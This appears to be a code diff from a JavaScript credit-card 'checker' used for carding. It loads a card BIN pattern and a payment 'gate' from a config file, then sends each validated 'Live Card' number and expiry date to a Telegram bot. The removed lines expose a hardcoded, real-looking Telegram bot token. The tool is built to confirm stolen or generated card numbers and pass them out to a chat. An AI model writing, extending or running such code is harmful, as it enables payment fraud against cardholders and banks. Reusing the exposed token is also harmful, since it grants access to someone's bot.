@@ -14,7 +14,7 @@ var binFileBuffer = await readFile(resolve("./env.txt"));
 var binFileContent = binFileBuffer.toString();;
 
 //return console.log(JSON.stringify(binFileContent))
-var [bin, gate, group_id, person_chat_id ] = binFileContent.split("\r\n").map(e => e.split("=")[1])
+var [bin, gate, group_id, person_chat_id, bot_token ] = binFileContent.split("\r\n").map(e => e.split("=")[1])
 /* 
 const bin = "43561902140xxxxx|03|2029|rnd";
 var gate = ".ap"; */
@@ -363,9 +363,10 @@ async function notificartelegramTarjetaLive(liveCardObj) {
   message+="Live Card ✅\n\n";
   message+="*Card:* `"+liveCardObj.card+"`\n";
   message+="*Date:* `"+liveCardObj.date+"`\n";
-  message+="*Bin:* `"+bin+"`";
+  message+="*Bin:* `"+bin+"`\n";
+  message+="*Gate:* `"+gate+"`";
   var apiEndpoint = "https://api.telegram.org/bot";
-  var token = "6832202278:AAFjb4FtUKxH47-37kiE7apho9s8X6nDpvk";
+  
   try {
   
       var options =
@@ -389,7 +390,7 @@ async function notificartelegramTarjetaLive(liveCardObj) {
   
       };    
   
-    var response = await fetch(apiEndpoint+token+"/", options);
+    var response = await fetch(apiEndpoint+bot_token+"/", options);
     var responseMessage = await response.json();
     if(responseMessage.ok){
       console.log("Se envio la live "+liveCardObj.card+" a el telegram")
